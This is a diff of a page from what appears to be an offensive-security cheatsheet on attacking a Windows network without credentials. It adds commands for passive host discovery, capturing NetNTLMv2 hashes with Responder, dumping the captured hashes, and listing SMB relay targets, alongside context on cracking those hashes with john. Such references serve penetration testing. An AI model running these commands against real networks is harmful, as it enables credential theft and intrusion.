@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-09-28T18:26:38 CEST">
+<meta name="revised" content="2020-10-11T16:30:26 CEST">
 <title>Out of Domain (No credentials) :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1740,7 +1740,10 @@
 
 <h3 id="identification">Identification</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Passiv network listening to identify machines</span>
-sudo netdiscover -p -i eth0 
+<span style="color:#75715e"># By default, it uses interactive mode (incompatible with clean output)</span>
+<span style="color:#75715e"># You can use the -P option to get off interactive</span>
+sudo netdiscover -p -i eth0
+sudo netdiscover -p -i eth0 -P
 
 <span style="color:#75715e"># You can find the domain big using dig</span>
 dig -x IP
@@ -1767,7 +1770,8 @@ john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style
 responder -I eth0 -rv
 responder -I &lt;interface&gt; -r -d -w
 
-<span style="color:#75715e"># You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec</span>
+<span style="color:#75715e"># All captured hashes are stored and can be retrieved using the DumpHash.py script</span>
+$ sudo python DumpHash.py</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec</span>
 python RunFinger.py -i <span style="color:#ae81ff">10</span>.0.2.0/24
 cme smb &lt;CIDR&gt; --gen-relay-list targets.txt
 
